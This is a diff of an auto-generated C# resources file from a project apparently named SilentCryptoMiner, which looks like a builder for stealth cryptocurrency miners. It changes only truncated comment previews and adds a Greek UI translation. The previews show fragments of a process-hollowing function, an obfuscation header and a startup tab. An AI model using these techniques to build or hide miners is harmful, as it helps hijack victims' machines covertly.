@@ -209,8 +209,7 @@ namespace SilentCryptoMiner.Properties {
         ///
         ///HANDLE process_hollowing(wchar_t* programPath, wchar_t* cmdLine, wchar_t* runtimeData, BYTE* payloadBuf, wchar_t* startDir)
         ///{
-        ///    PROCESS_INFORMATION pi = create_new_process_internal(programPath, cmdLine, startDir, runtimeData, 0, AYU_OBFC(THREAD_CREATE_FLAGS_CREATE_SUSPENDED));
-        ///    if ( [rest of string was truncated]&quot;;.
+        ///    PROCESS_INFORMATION pi = create_new_process_internal(programPath, cmdLine, startDir, runtimeData, 0, AYU_OBFC(THREAD_CREATE_FLAGS_CREATE_SUSPENDED)) [rest of string was truncated]&quot;;.
         /// </summary>
         public static string inject_cpp {
             get {
@@ -241,14 +240,13 @@ namespace SilentCryptoMiner.Properties {
         ///    &lt;Text Lang=&quot;es&quot;&gt;Principal&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;ru&quot;&gt;Основное&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;ptbr&quot;&gt;Principal&lt;/Text&gt;
+        ///    &lt;Text Lang=&quot;gr&quot;&gt;Κεντρική&lt;/Text&gt;
         ///  &lt;/Control&gt;
         ///  &lt;Control Name=&quot;tabStartup&quot;&gt;
         ///    &lt;Text Lang=&quot;en&quot;&gt;Startup&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;sv&quot;&gt;Uppstart&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;pl&quot;&gt;Start&lt;/Text&gt;
-        ///    &lt;Text Lang=&quot;es&quot;&gt;Inicio&lt;/Text&gt;
-        ///    &lt;Text Lang=&quot;ru&quot;&gt;Автозапуск&lt;/Text&gt;
-        ///   [rest of string was truncated]&quot;;.
+        ///    &lt;Text Lang=&quot;es&quot;&gt;Ini [rest of string was truncated]&quot;;.
         /// </summary>
         public static string LocalizedControls {
             get {
@@ -328,10 +326,7 @@ namespace SilentCryptoMiner.Properties {
         ///#endif 
         ///
         ///#ifndef STATUS_INFO_LENGTH_MISMATCH
-        ///#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
-        ///#endif
-        ///
-        ///#ifndef OBJ_C [rest of string was truncated]&quot;;.
+        ///#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004 [rest of string was truncated]&quot;;.
         /// </summary>
         public static string ntddk_h {
             get {
@@ -354,9 +349,7 @@ namespace SilentCryptoMiner.Properties {
         ///
         ///Current unified version is stripped of some functions that the original version has but those can be re-added easily if wanted.
         ///
-        ///----------------------------------------------------------------------------- */
-        ///
-        ///#ifndef  [rest of string was truncated]&quot;;.
+        ///---------------------------------------------------------------------------- [rest of string was truncated]&quot;;.
         /// </summary>
         public static string obfuscateu_h {
             get {
